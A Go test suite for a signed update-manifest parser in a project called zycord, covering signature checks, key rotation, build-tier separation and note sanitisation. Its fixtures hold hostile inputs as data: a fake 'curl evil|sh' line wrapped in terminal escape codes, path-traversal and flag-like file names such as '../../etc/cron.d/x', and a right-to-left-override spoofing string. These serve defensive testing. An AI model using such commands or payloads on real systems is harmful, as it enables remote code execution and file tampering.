package update_test

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"

	"zycord/update"
)

// signer is a throwaway key set plus the private halves to sign with, so the
// tests exercise real ed25519 rather than a stub.
type signer struct {
	set          update.KeySet
	current      ed25519.PrivateKey
	next         ed25519.PrivateKey
	currentID    string
	nextID       string
	strangerPriv ed25519.PrivateKey
}

func newSigner(t *testing.T) signer {
	t.Helper()
	curPub, curPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	nxtPub, nxtPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	_, strangerPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	raw := fmt.Sprintf(`{"schema":1,"algorithm":"ed25519","keys":[
		{"id":"zu1","role":"current","key":"%s"},
		{"id":"zu2","role":"next","key":"%s"}]}`,
		hex.EncodeToString(curPub), hex.EncodeToString(nxtPub))
	set, err := update.ParseKeys([]byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	return signer{set: set, current: curPriv, next: nxtPriv, currentID: "zu1", nextID: "zu2", strangerPriv: strangerPriv}
}

func (s signer) sign(priv ed25519.PrivateKey, raw []byte) []byte {
	return []byte(hex.EncodeToString(ed25519.Sign(priv, raw)) + "\n")
}

// goodManifest is a complete, well-formed document. Tests mutate the JSON text
// rather than a struct, because the text is what gets signed.
func goodManifest() string {
	sum := sha256.Sum256([]byte("archive bytes"))
	d := hex.EncodeToString(sum[:])
	return `{
  "schema": 1,
  "project": "zycord",
  "version": "v0.2.0",
  "published_at": "2026-09-30T14:02:11Z",
  "urgency": "routine",
  "note": "Nothing alarming.",
  "products": {
    "zycord-cli": {
      "assets": {
        "linux-amd64": {"file": "zycord-0.2.0-linux-amd64.tar.gz", "sha256": "` + d + `", "size": 7340032},
        "linux-amd64-randomx": {"file": "zycord-0.2.0-linux-amd64-randomx.tar.gz", "sha256": "` + d + `", "size": 9437184},
        "windows-arm64": {"file": "zycord-0.2.0-windows-arm64.zip", "sha256": "` + d + `", "size": 7340032}
      }
    }
  }
}`
}

// withSupersedes inserts a supersedes claim into the fixture.
func withSupersedes(id string) string {
	return strings.Replace(goodManifest(),
		`"urgency": "routine",`,
		`"urgency": "routine",`+"\n  "+`"supersedes": "`+id+`",`, 1)
}

// TestAValidManifestVerifiesAndParses is the happy path, and it also pins that
// the id of the key that verified is reported back.
func TestAValidManifestVerifiesAndParses(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest())
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatalf("a well-formed manifest was refused: %v", err)
	}
	if m.Version != "v0.2.0" {
		t.Errorf("Version = %q", m.Version)
	}
	if m.SignedBy != s.currentID {
		t.Errorf("SignedBy = %q, want %q", m.SignedBy, s.currentID)
	}
	if !m.Parsed.Release {
		t.Error("the parsed version is not a release")
	}
}

// TestASemanticallyEqualManifestWithDifferentBytesFailsVerification is the test
// that pins verify-then-parse.
//
// The two documents mean exactly the same thing. Any verifier that
// canonicalises before checking — re-serialising, sorting keys, normalising
// whitespace — accepts the second under the first's signature, which is a
// signature valid over bytes nobody ever saw.
func TestASemanticallyEqualManifestWithDifferentBytesFailsVerification(t *testing.T) {
	s := newSigner(t)
	original := []byte(goodManifest())
	sig := s.sign(s.current, original)

	var round map[string]any
	if err := json.Unmarshal(original, &round); err != nil {
		t.Fatal(err)
	}
	reserialised, err := json.Marshal(round)
	if err != nil {
		t.Fatal(err)
	}
	if string(reserialised) == string(original) {
		t.Fatal("the re-serialised document is byte-identical, so this test proves nothing")
	}
	if _, err := update.ParseManifest(reserialised, sig, s.set); !errors.Is(err, update.ErrBadSignature) {
		t.Errorf("a re-serialised manifest verified under the original's signature: err = %v", err)
	}
}

// TestASignatureFromAStrangerIsRefused is the base case, and it must produce
// ErrBadSignature rather than anything that reads like "no update available".
func TestASignatureFromAStrangerIsRefused(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest())
	if _, err := update.ParseManifest(raw, s.sign(s.strangerPriv, raw), s.set); !errors.Is(err, update.ErrBadSignature) {
		t.Errorf("err = %v, want ErrBadSignature", err)
	}
}

// TestTheSpareSignsRotationsAndNothingElse is the hardening that keeps a stolen
// spare from being strictly worse than a stolen signing key.
//
// The spare is accepted by every binary that carries it, so if it could sign
// ordinary releases too, stealing it would buy everything stealing `current`
// buys AND the ability to retire `current`. Restricting it does not make a
// stolen spare harmless — it can still sign the rotation that promotes it — but
// it forces the attack to be a visible, permanent, publicly signed key change
// rather than a quiet release nobody looks at twice.
func TestTheSpareSignsRotationsAndNothingElse(t *testing.T) {
	s := newSigner(t)

	raw := []byte(goodManifest()) // an ordinary release, no supersedes
	if _, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set); err == nil {
		t.Error("the held-back key signed an ordinary release; a stolen spare would be strictly " +
			"worse than a stolen signing key")
	}

	// The rotation it exists for still works.
	raw = []byte(withSupersedes("zu1"))
	m, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set)
	if err != nil {
		t.Fatalf("the spare could not sign a rotation, which is the only thing it is for: %v", err)
	}
	if m.SignedBy != s.nextID {
		t.Errorf("SignedBy = %q, want %q", m.SignedBy, s.nextID)
	}
}

// TestARotationIsAnOrdinaryUpdateForTheBinariesItProduces is the regression for
// the deadlock that made the rotation design not work at all.
//
// After a rotation the rotation manifest is still the newest release. A
// freshly-updated binary holds zu2 as `current` and zu3 as `next`, and reads a
// manifest signed by zu2 that supersedes zu1. The first version of
// validateSupersedes read `supersedes` as a live instruction aimed at the
// reader, so it demanded the signer be THIS build's spare — zu2 is not — and
// refused. Every updated node then errored on every check until an unrelated
// release shipped, which is exactly the fleet-wide breakage the spare exists to
// avoid, and it broke the property PR 16's whole argument rests on.
//
// `supersedes` is a record of a transition, not a command. A build that has
// already moved past it ignores it.
func TestARotationIsAnOrdinaryUpdateForTheBinariesItProduces(t *testing.T) {
	pub1, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	pub2, priv2, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	pub3, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	set := func(curID, cur, nextID, next string) update.KeySet {
		ks, err := update.ParseKeys([]byte(fmt.Sprintf(
			`{"schema":1,"algorithm":"ed25519","keys":[{"id":%q,"role":"current","key":%q},{"id":%q,"role":"next","key":%q}]}`,
			curID, cur, nextID, next)))
		if err != nil {
			t.Fatal(err)
		}
		return ks
	}
	h := hex.EncodeToString
	before := set("zu1", h(pub1), "zu2", h(pub2)) // what shipped
	after := set("zu2", h(pub2), "zu3", h(pub3))  // what the rotation produces

	raw := []byte(withSupersedes("zu1"))
	sig := []byte(h(ed25519.Sign(priv2, raw)) + "\n")

	if _, err := update.ParseManifest(raw, sig, before); err != nil {
		t.Fatalf("the rotation manifest was refused by the binaries it is aimed at: %v", err)
	}
	m, err := update.ParseManifest(raw, sig, after)
	if err != nil {
		t.Fatalf("the rotation manifest was refused by the binaries it PRODUCED, so every "+
			"updated node errors on every check until an unrelated release ships: %v", err)
	}
	if m.Version != "v0.2.0" {
		t.Errorf("Version = %q", m.Version)
	}
}

// TestAStolenCurrentKeyCannotRevokeTheSpare is named for the attack it stops.
//
// If revocation were general, whoever stole the signing key could sign a
// manifest retiring the GOOD key and strand every node permanently — turning a
// key compromise into an unrecoverable one. The rule is that only the spare may
// supersede the signing key, so a stolen signing key can revoke nothing, and the
// worst it buys is what it already had.
func TestAStolenCurrentKeyCannotRevokeTheSpare(t *testing.T) {
	s := newSigner(t)

	// The attack: signed by the stolen current key, retiring the spare.
	raw := []byte(withSupersedes("zu2"))
	if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
		t.Fatal("a manifest signed by the current key retired the spare; a stolen key could strand the fleet")
	}

	// And the mirror image: the current key cannot even retire itself.
	raw = []byte(withSupersedes("zu1"))
	if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
		t.Error("a manifest signed by the current key retired the current key")
	}
}

// TestOnlyTheSpareMaySupersedeTheSigningKey is the legitimate rotation, which
// must still work after the test above.
func TestOnlyTheSpareMaySupersedeTheSigningKey(t *testing.T) {
	s := newSigner(t)
	raw := []byte(withSupersedes("zu1"))
	m, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set)
	if err != nil {
		t.Fatalf("the spare could not retire the signing key, so a rotation is impossible: %v", err)
	}
	if m.Supersedes != "zu1" {
		t.Errorf("Supersedes = %q", m.Supersedes)
	}

	// A spare-signed manifest naming a key that is not the current one is still
	// refused: promotion is a specific claim, not a free-form one.
	raw = []byte(withSupersedes("zu9"))
	if _, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set); err == nil {
		t.Error("a manifest superseded a key this build does not hold as current")
	}
}

// TestASignedButUnusableManifestIsRefused covers documents that verify and are
// still not something to act on. Each one would otherwise reach a user as
// silence or as a wrong answer.
func TestASignedButUnusableManifestIsRefused(t *testing.T) {
	sum := sha256.Sum256([]byte("x"))
	good := hex.EncodeToString(sum[:])
	for _, tc := range []struct{ name, raw string }{
		{"a schema this build cannot read",
			`{"schema":2,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"` + good + `","size":10}}}}}`},
		{"a manifest for another project",
			`{"schema":1,"project":"notzycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{}}}}`},
		{"a version that is not a release tag",
			`{"schema":1,"project":"zycord","version":"v0.2.0-3-gabcdef1","products":{"zycord-cli":{"assets":{}}}}`},
		{"a version that is not a version",
			`{"schema":1,"project":"zycord","version":"tomorrow","products":{"zycord-cli":{"assets":{}}}}`},
		{"no products at all",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{}}`},
		{"a product publishing no assets",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{}}}}`},
		{"an asset whose file name is a path",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"../../etc/cron.d/x","sha256":"` + good + `","size":10}}}}}`},
		{"an asset with no usable digest",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"nope","size":10}}}}}`},
		{"an asset of zero size",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"` + good + `","size":0}}}}}`},
		{"an asset above the download ceiling",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"` + good + `","size":1099511627776}}}}}`},
		{"trailing content after the document",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{}}}} {"schema":1}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s := newSigner(t)
			raw := []byte(tc.raw)
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
				t.Errorf("accepted a signed manifest with %s", tc.name)
			}
		})
	}
}

// TestTheTierIsNeverCrossed is the property that protects a working miner, and
// the fixture is the whole test.
//
// The first version of this test asked for windows-arm64-randomx against a
// manifest that published NOTHING for windows-arm64 — so a tier-crossing
// fallback would have had nothing to fall back to, and the test named for this
// package's central property could not observe its violation. Adding a
// deliberate `strings.CutSuffix(key, "-randomx")` fallback to Manifest.Asset
// left the whole suite green.
//
// The fixture now publishes windows-arm64 as a PLAIN archive and no -randomx
// one, which is the real shape: no cross-toolchain and no native runner for that
// target. A fallback would find the plain archive, so refusing to take it is now
// a thing the test can see.
func TestTheTierIsNeverCrossed(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest())
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}

	plain := update.MustPlatformKey("windows", "arm64", update.TierPlain)
	randomx := update.MustPlatformKey("windows", "arm64", update.TierRandomX)

	// The bait: there IS something to fall back to.
	if _, err := m.Asset(update.ProductCLI, plain); err != nil {
		t.Fatalf("the fixture no longer publishes %s, so this test proves nothing again: %v", plain, err)
	}
	// And it must not be taken.
	if _, err := m.Asset(update.ProductCLI, randomx); !errors.Is(err, update.ErrNoAssetForTier) {
		t.Errorf("asking for %s gave err = %v, want ErrNoAssetForTier — a binary that mines "+
			"was handed a binary that refuses to start on any real network", randomx, err)
	}

	if update.MustPlatformKey("linux", "amd64", update.TierPlain) == randomx {
		t.Fatal("the two tiers produce the same asset key, so nothing separates them")
	}
	if _, err := m.Asset(update.ProductCLI, update.MustPlatformKey("linux", "amd64", update.TierRandomX)); err != nil {
		t.Errorf("the randomx archive that IS published was not found: %v", err)
	}
	if _, err := m.Asset(update.ProductWallet, update.MustPlatformKey("linux", "amd64", update.TierPlain)); !errors.Is(err, update.ErrNoAssetForTier) {
		t.Errorf("an unpublished product resolved: %v", err)
	}
}

// TestAKeyAndTheFileItNamesMustAgreeAboutTheTier closes the mislabel hole.
//
// Making the tier part of the asset key only makes a crossing unrepresentable if
// the key and the archive it names agree. Otherwise a manifest whose
// linux-amd64-randomx entry points at the PLAIN archive parses, validates and
// installs — the tier crossed through the exact mechanism meant to prevent it,
// and no signature is violated because the maintainer signed the mislabel.
func TestAKeyAndTheFileItNamesMustAgreeAboutTheTier(t *testing.T) {
	s := newSigner(t)
	for _, tc := range []struct{ name, from, to string }{
		{"a randomx key naming the plain archive",
			`"linux-amd64-randomx": {"file": "zycord-0.2.0-linux-amd64-randomx.tar.gz"`,
			`"linux-amd64-randomx": {"file": "zycord-0.2.0-linux-amd64.tar.gz"`},
		{"a plain key naming the randomx archive",
			`"linux-amd64": {"file": "zycord-0.2.0-linux-amd64.tar.gz"`,
			`"linux-amd64": {"file": "zycord-0.2.0-linux-amd64-randomx.tar.gz"`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			raw := []byte(strings.Replace(goodManifest(), tc.from, tc.to, 1))
			if string(raw) == goodManifest() {
				t.Fatal("the fixture did not change, so this case tests nothing")
			}
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
				t.Error("accepted a manifest whose key and file disagree about the tier")
			}
		})
	}
}

// TestTierForMapsTheEngineToTheTier pins the one input that decides which
// archive a binary is allowed to take.
func TestTierForMapsTheEngineToTheTier(t *testing.T) {
	if got := update.TierFor(true); got != update.TierRandomX {
		t.Errorf("TierFor(true) = %q, want %q", got, update.TierRandomX)
	}
	if got := update.TierFor(false); got != update.TierPlain {
		t.Errorf("TierFor(false) = %q, want %q", got, update.TierPlain)
	}
	if got := update.MustPlatformKey("linux", "amd64", update.TierPlain); got != "linux-amd64" {
		t.Errorf("plain key = %q", got)
	}
	if got := update.MustPlatformKey("linux", "amd64", update.TierRandomX); got != "linux-amd64-randomx" {
		t.Errorf("randomx key = %q", got)
	}
}

// TestTheNoteCannotRepaintATerminal. The note is signed, which says where it
// came from. It does not say it is safe to write to a terminal.
func TestTheNoteCannotRepaintATerminal(t *testing.T) {
	s := newSigner(t)

	// esc is the six characters JSON spells an escape character with. Building
	// the fixture this way keeps control characters out of this source file and
	// makes the DECODER produce them, which is the path a real hostile note
	// takes. A literal one here would also be unable to survive the tracked-file
	// text scan in sim/wiring.
	const esc = "\\u001b"
	hostile := "Fixed a bug." + esc + "[2J" + esc + "[HYour node is compromised, run: curl evil|sh"
	raw := []byte(strings.Replace(goodManifest(), `"Nothing alarming."`, `"`+hostile+`"`, 1))
	if !strings.Contains(string(raw), esc) {
		t.Fatal("the fixture lost its escapes, so this test proves nothing")
	}
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}
	if m.Note == "" {
		t.Fatal("the note was emptied entirely rather than sanitised")
	}
	for _, r := range m.Note {
		if (r < 0x20 && r != '\n') || r == 0x7f || (r >= 0x80 && r <= 0x9f) {
			t.Fatalf("the note kept control character %q", r)
		}
	}

	long := strings.Repeat("a", 4000)
	raw = []byte(strings.Replace(goodManifest(), `"Nothing alarming."`, `"`+long+`"`, 1))
	m, err = update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}
	if len(m.Note) > 600 {
		t.Errorf("the note is %d bytes; an operator's screen is not the release notes", len(m.Note))
	}
}

// TestAnUnknownUrgencyDegradesRatherThanFailing. An old binary cannot act on a
// level it does not know, and a future manifest must not be able to make it
// shout by inventing one.
func TestAnUnknownUrgencyDegradesRatherThanFailing(t *testing.T) {
	s := newSigner(t)
	raw := []byte(strings.Replace(goodManifest(), `"urgency": "routine"`, `"urgency": "apocalyptic"`, 1))
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatalf("an unknown urgency was refused rather than degraded: %v", err)
	}
	if m.Urgency != update.UrgencyRoutine {
		t.Errorf("Urgency = %q, want %q", m.Urgency, update.UrgencyRoutine)
	}
}

// TestTheSignatureFileIsParsedStrictly. A lenient parser here is where two
// implementations start disagreeing about what was signed.
func TestTheSignatureFileIsParsedStrictly(t *testing.T) {
	valid := strings.Repeat("ab", ed25519.SignatureSize)
	for _, tc := range []struct {
		name string
		sig  string
		ok   bool
	}{
		{"exact", valid, true},
		{"one trailing newline", valid + "\n", true},
		{"CRLF", valid + "\r\n", true},
		{"upper case", strings.ToUpper(valid), false},
		{"too short", valid[:len(valid)-2], false},
		{"too long", valid + "ab", false},
		{"not hex", strings.Repeat("zz", ed25519.SignatureSize), false},
		{"empty", "", false},
		{"leading space", " " + valid, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := update.ParseSignature([]byte(tc.sig))
			if tc.ok && err != nil {
				t.Errorf("rejected a valid signature file: %v", err)
			}
			if !tc.ok && err == nil {
				t.Error("accepted a malformed signature file")
			}
		})
	}
}

// TestForwardCompatibilityIsPossibleAtAll.
//
// The manifest is a wire format read by binaries older than the release that
// wrote it, and every one of those is frozen at genesis. If unknown fields were
// refused, any field a later release needs would be rejected by every binary
// already shipped — and bumping `schema` to add one makes those binaries refuse
// the manifest outright, so between them there would be no way to add anything,
// ever. The document is signed, so ignoring what we do not understand is free.
//
// This is the opposite of the rule keys.json is parsed under, deliberately: that
// file is ours and must carry keys and nothing else.
func TestForwardCompatibilityIsPossibleAtAll(t *testing.T) {
	s := newSigner(t)
	raw := []byte(strings.Replace(goodManifest(),
		`"urgency": "routine",`,
		`"urgency": "routine",`+"\n  "+`"a_field_from_a_later_release": {"nested": [1,2,3]},`, 1))
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatalf("a manifest carrying a field this build does not know was refused, which "+
			"freezes the format at genesis: %v", err)
	}
	if m.Version != "v0.2.0" {
		t.Errorf("Version = %q", m.Version)
	}
}

// TestTrailingContentIsRefusedAfterACloseBracket covers the hole json.Decoder's
// More() leaves.
//
// More() reports whether another element follows in an array or object, so it
// answers false whenever the next byte is `]` or `}` — and the original check
// accepted `{...}] anything at all`. The `{` case passed for an unrelated
// reason, which is why the first test of this could not see it.
func TestTrailingContentIsRefusedAfterACloseBracket(t *testing.T) {
	s := newSigner(t)
	for _, suffix := range []string{
		`] anything at all`,
		`}`,
		`{"schema":1,"evil":true}`,
		` [1,2,3]`,
		`garbage`,
	} {
		t.Run(suffix, func(t *testing.T) {
			raw := []byte(goodManifest() + suffix)
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
				t.Errorf("accepted a document with %q after it", suffix)
			}
		})
	}
	// And trailing whitespace, which is not trailing content.
	raw := []byte(goodManifest() + "\n\n  \t\n")
	if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err != nil {
		t.Errorf("trailing whitespace was treated as content: %v", err)
	}
}

// TestAnAssetKeyMustLookLikeOne.
//
// Without a shape check a typo'd key is indistinguishable from "we publish
// nothing for your platform": `"linux-amd64 "` silently offers nothing to every
// linux-amd64 node, and the failure surfaces as silence rather than as the
// maintainer error it is.
func TestAnAssetKeyMustLookLikeOne(t *testing.T) {
	sum := sha256.Sum256([]byte("x"))
	good := hex.EncodeToString(sum[:])
	for _, key := range []string{
		"linux-amd64 ", " linux-amd64", "linux amd64", "Linux-amd64",
		"linux", "linux-amd64-randomx-extra", "-linux-amd64", "linux-amd64-",
		"linux--amd64", "", "linux/amd64", "linux-amd64\n",
	} {
		t.Run(key, func(t *testing.T) {
			s := newSigner(t)
			raw := []byte(fmt.Sprintf(
				`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{%q:{"file":"a.tar.gz","sha256":%q,"size":10}}}}}`,
				key, good))
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
				t.Errorf("accepted asset key %q", key)
			}
		})
	}
}

// TestAnAssetFileMustBeAPlainName.
//
// The deny-list this replaced tested only the two path separators and accepted
// every other way a name becomes something else. Each case names the shape it
// stands for, and every one is asserted rather than exempted — an exemption list
// in a test is how a check that stopped running keeps looking like it runs.
func TestAnAssetFileMustBeAPlainName(t *testing.T) {
	sum := sha256.Sum256([]byte("x"))
	good := hex.EncodeToString(sum[:])
	for _, tc := range []struct{ file, why string }{
		{"../../etc/cron.d/x", "a POSIX path"},
		{"C:evil", "a Windows drive-relative path"},
		{"a.tar.gz:stream", "an NTFS alternate data stream"},
		{"CON", "a Windows reserved device name"},
		{"nul.tar.gz", "a reserved device name with an extension"},
		{"-rf", "a name that becomes a flag"},
		{"%2e%2e%2fetc", "an encoded traversal something downstream may decode"},
		{"...", "a name that is only dots"},
		{"..a", "a name containing .."},
		{".hidden", "a leading dot"},
		{"", "no name at all"},
		{"a b.tar.gz", "an embedded space"},
		{"sub/dir.tar.gz", "a subdirectory"},
	} {
		t.Run(tc.why, func(t *testing.T) {
			s := newSigner(t)
			raw := []byte(fmt.Sprintf(
				`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":%q,"sha256":%q,"size":10}}}}}`,
				tc.file, good))
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
				t.Errorf("accepted asset file %q (%s)", tc.file, tc.why)
			}
		})
	}

	// And the shape a real archive has must still pass.
	for _, file := range []string{
		"zycord-0.2.0-linux-amd64.tar.gz",
		"zycord-0.2.0-windows-amd64.zip",
		"zycord-wallet-0.2.0-darwin-arm64.zip",
	} {
		t.Run("accepts "+file, func(t *testing.T) {
			s := newSigner(t)
			raw := []byte(fmt.Sprintf(
				`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":%q,"sha256":%q,"size":10}}}}}`,
				file, good))
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err != nil {
				t.Errorf("refused a real archive name %q: %v", file, err)
			}
		})
	}
}

// TestTheNoteCannotReverseItself is the Trojan-Source case a C0/C1 filter leaves
// open: U+202E reverses everything after it, so a signed note can be made to
// read as the opposite of what a reader would copy.
func TestTheNoteCannotReverseItself(t *testing.T) {
	s := newSigner(t)
	const rlo = "\\u202e"  // RIGHT-TO-LEFT OVERRIDE
	const zwsp = "\\u200b" // ZERO WIDTH SPACE
	raw := []byte(strings.Replace(goodManifest(), `"Nothing alarming."`,
		`"Safe update.`+rlo+`gs.live/tag`+zwsp+`elif"`, 1))
	if !strings.Contains(string(raw), "u202e") {
		t.Fatal("the fixture lost its escapes, so this test proves nothing")
	}
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range m.Note {
		if (r >= 0x202a && r <= 0x202e) || (r >= 0x2066 && r <= 0x2069) ||
			r == 0x200b || r == 0x200c || r == 0x200d || r == 0xfeff ||
			r == 0x200e || r == 0x200f || r == 0x061c {
			t.Errorf("the note kept %U, which can make it read as something else", r)
		}
	}
}
